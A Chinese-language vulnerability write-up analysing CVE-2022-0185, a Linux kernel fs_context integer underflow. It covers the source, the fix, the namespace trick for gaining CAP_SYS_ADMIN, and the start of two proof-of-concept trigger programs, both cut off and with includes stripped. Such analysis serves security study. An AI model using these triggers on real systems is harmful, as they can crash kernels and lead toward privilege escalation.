
## 源码分析

```c
if (strchr(param->key, ',') ||
    (param->type == fs_value_is_string &&
     memchr(param->string, ',', param->size)))
        return invalf(fc, "VFS: Legacy: Option '%s' contained comma",
                      param->key);

if (!ctx->legacy_data) {
        ctx->legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);
        if (!ctx->legacy_data)
                return -ENOMEM;
}

ctx->legacy_data[size++] = ',';
len = strlen(param->key);
memcpy(ctx->legacy_data + size, param->key, len);
size += len;

if (param->type == fs_value_is_string) {
        ctx->legacy_data[size++] = '=';
        memcpy(ctx->legacy_data + size, param->string, param->size);
        size += param->size;
}

ctx->legacy_data[size] = '\0';
ctx->data_size = size;
ctx->param_type = LEGACY_FS_INDIVIDUAL_PARAMS;
return 0;
}
```

我们接下来分批次查看上述源码。

### step1

首先便是一系列赋值：

```c
static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)
{
        struct legacy_fs_context *ctx = fc->fs_private;         //初始化时为zalloc分配的一段堆空间
        unsigned int size = ctx->data_size;                 //第一次调用的时候，size应该还是0
        size_t len = 0;
        int ret;
```

在我们一开始分配 `fscontext` 的时候，会调用 `legacy_init_fs_context()` 函数，他会将我们的 `fc->fs_private` 分配一个填充 0 的堆块，然后该代码就是将其堆块赋值给 `ctx` 字段，然后赋值其中的 `size`，注意在我们第一次调用到该函数的时候，其都为 0。

### step2

```c
switch (param->type) {
        case fs_value_is_string:
                len = 1 + param->size;                         //len被赋值为1+（_value）的长度
                fallthrough;
        ...
        }

if (len > PAGE_SIZE - 2 - size)
        return invalf(fc, "VFS: Legacy: Cumulative options too large");
```

这里我将多余代码去除，可以看到 `len` 被赋值为我们之前传入的 `_value` 值的大小 +1，然后之后就有一个判断，但是这里的判断是存在漏洞的。

因为 `len` 的类型为 `size_t`，`size` 的类型同样也是 `unsigned int`，因此如果说我们的 `size + 2 > PAGE_SIZE` 的话，右边就会出现一个极大的数，然后我们的 `len` 长度就可以任意覆盖且绕过判断，具体有啥用处我们之后再详细讲解。

### step3

```c
if (strchr(param->key, ',') ||
    (param->type == fs_value_is_string &&
     memchr(param->string, ',', param->size)))
        return invalf(fc, "VFS: Legacy: Option '%s' contained comma",
                      param->key);
if (!ctx->legacy_data) {
        ctx->legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);
        if (!ctx->legacy_data)
                return -ENOMEM;
}
```

其中第一个 `if` 判断我们传入的 `key` 是否包含 `,`，或 `value` 当中是否包含 `,`，然后如果咱们是第一次调用该函数，那么 `legacy_data` 应该为 0，所以这里会调用我们的 `kmalloc`，并从 `kmalloc-4k` 当中取。

### step4

```c
ctx->legacy_data[size++] = ',';
len = strlen(param->key);
memcpy(ctx->legacy_data + size, param->key, len);
size += len;

if (param->type == fs_value_is_string) {
        ctx->legacy_data[size++] = '=';
        memcpy(ctx->legacy_data + size, param->string, param->size);
        size += param->size;
}

ctx->legacy_data[size] = '\0';
ctx->data_size = size;
ctx->param_type = LEGACY_FS_INDIVIDUAL_PARAMS;
return 0;
}
```

这里就是拷贝我们的 `ctx` 之中缓冲区的过程，其中 `ctx->legacy_data` 应该是这种情况：

```text
{,key_0=value_0,key_1=value_1,......\0}
```

修改这个 `ctx` 实际上就是修改我们 `(struct legacy_fs_context)fc->fs_private` 的过程。

该 bug 自从 [commit 3e1aeb00e6d132efc151dacc062b38269bc9eccc](https://github.com/torvalds/linux/commit/3e1aeb00e6d132efc151dacc062b38269bc9eccc#diff-c4a9ea83de4a42a0d1bcbaf1f03ce35188f38da4987e0e7a52aae7f04de14a05) 开始出现，其中的修复也十分简单，仅仅是将其中的减法替换为加法，这样就不会存在溢出的情况。

```diff
diff --git a/fs/fs_context.c b/fs/fs_context.c
index de1985eae..a195e516f 100644
--- a/fs/fs_context.c
+++ b/fs/fs_context.c
@@ -548,7 +548,7 @@ static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)
                              param->key);
        }
-       if (len > PAGE_SIZE - 2 - size)
+       if (size + len + 2 > PAGE_SIZE)
                return invalf(fc, "VFS: Legacy: Cumulative options too large");
        if (strchr(param->key, ',') ||
```

## 2. 漏洞触发 PoC 编写

这里先给出洞主的 PoC：

```c
#define _GNU_SOURCE
#include 
#include 
#include 

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
#define FSCONFIG_SET_STRING 1
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)

int main(void)
{
        char* val = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        int fd = 0;
        fd = fsopen("9p", 0);
        if (fd 
```

这里最初发现无法触发漏洞，但是 willsroot 本人所说是“reliably”。

![](http://imgsrc.baidu.com/forum/pic/item/18d8bc3eb13533fa3488151feed3fd1f41345bc1.jpg)

经过打印调试 :dog:，发现返回值为 `-1`，到源码里面发现是在这一步进行了返回。

![](http://imgsrc.baidu.com/forum/pic/item/d1a20cf431adcbef0c11f837eaaf2edda3cc9fde.jpg)

而网上搜寻资料得知，`ns_capable()` 负责主体（进程）和客体（资源）的 capability 进行校验。

```c
/**
 * ns_capable - Determine if the current task has a superior capability in effect
 * @ns:  The usernamespace we want the capability in
 * @cap: The capability to be tested for
 *
 * Return true if the current task has the given superior capability currently
 * available for use, false if not.
 *
 * This sets PF_SUPERPRIV on the task if the capability is available on the
 * assumption that it's about to be used.
 */
bool ns_capable(struct user_namespace *ns, int cap)
{
        return ns_capable_common(ns, cap, CAP_OPT_NONE);
}
```

这里就是在检查我们的用户命名空间的权限，解决方法截选自 [arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/#Proof-of-Concept](https://arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/#Proof-of-Concept)。

![](http://imgsrc.baidu.com/forum/pic/item/e850352ac65c10383b6148f3f4119313b07e89e0.jpg)

除此之外 willsroot 洞主的博客当中也有说明这一点，但就是不知道为啥在作者第一个 PoC 当中并未体现。

> This bug popped up since [commit 3e1aeb00e6d132efc151dacc062b38269bc9eccc](https://github.com/torvalds/linux/commit/3e1aeb00e6d132efc151dacc062b38269bc9eccc#diff-c4a9ea83de4a42a0d1bcbaf1f03ce35188f38da4987e0e7a52aae7f04de14a05). It’s important to note that you need the `CAP_SYS_ADMIN` capability to trigger it, but the permission only [fsopen.c#L122](https://elixir.bootlin.com/linux/v5.14.21/source/fs/fsopen.c#L122). Most unprivileged users can just `unshare(CLONE_NEWNS|CLONE_NEWUSER)` (equivalent of the command `unshare -Urm`) to enter a namespace with the `CAP_SYS_ADMIN` permission, and abuse the bug from there; this is what makes this such a dangerous vulnerability.

因此我们可以稍微修改一下 willsroot 师傅的 PoC 即可成功造成 kernel panic。

首先我们知道了漏洞点，其中我们该如何触发呢，那就是使得我们的 `size`，也就是我们已经写入的大小，但是现在有个问题，如果你任意调用 `fsconfig` 的话，或者说你调用 `fsconfig` 一直调用一天有可能也触发不了 kernel panic。

但其实原作者的 PoC 并不是瞎编的，也是通过了一定的计算，我们先来缕一缕。

首先我们每次写入的字节数应该是一个 `,`、一个 `=` 和我们 `key`、`value` 的长度，所以长度应该是 `length(key) + length(value) + 2`，并且我们每次需要通过这个检测：

```c
if (len > PAGE_SIZE - 2 - size)
        return invalf(fc, "VFS: Legacy: Cumulative options too large");
```

所以我们尽量需要满足 `size` 在 4095，也就是刚好需要填充满整个申请页面才行，不然如果说在之前填入的时候有空闲，那就不会继续写入，被这个检测拦住，所以我们需要刚好规划到 4095 这个 `size`，下面就是我按照自行理解所写 PoC，如下：

```c
#define _GNU_SOURCE 

#include 

#include 

#include 

#include 

#include 

- 

#include 

#include 

#include 

#include 

#include 

#ifndef __NR_fsopen

#define __NR_fsopen 430

#endif

#ifndef __NR_fsconfig

#define __NR_fsconfig 431

#endif

int fsopen(const char *fs_name, unsigned int flags)

{

    return syscall(__NR_fsopen, fs_name, flags);

}

int fsconfig(int fsfd, unsigned int cmd, 

             const char *key, const void *val, int aux)

{
```
